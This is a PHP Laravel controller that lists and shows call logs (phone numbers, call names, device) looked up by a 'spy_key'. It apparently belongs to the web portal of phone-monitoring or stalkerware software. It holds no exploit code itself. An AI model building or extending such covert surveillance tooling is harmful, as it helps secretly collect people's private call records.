<?php

namespace App\Http\Controllers;

use App\Models\CallLogs;

class CallLogsController extends Controller
{
    public function __construct(){
        $this->middleware('auth');
    }

    public function index($spy_key){
        $call_logs = CallLogs::where('spy_key', $spy_key)->select('phone_number', 'call_name', 'spy_key', 'device')->groupBy('phone_number')->paginate(15);

        $device = "";
        foreach ($call_logs as $call_log){
            $device = $call_log->device;
        }
        return view('portal.call_logs.index', compact('call_logs'))
            ->with('i', (request()->input('page', 1) - 1) * 15)
            ->with('device', $device);
    }

    public function get_logs($phone_number, $spy_key){
        $logs = CallLogs::where('phone_number',$phone_number)->where('spy_key', $spy_key)->get();

        return view('portal.call_logs.logs', compact('logs'))->with('phone_number',$phone_number);
    }
}
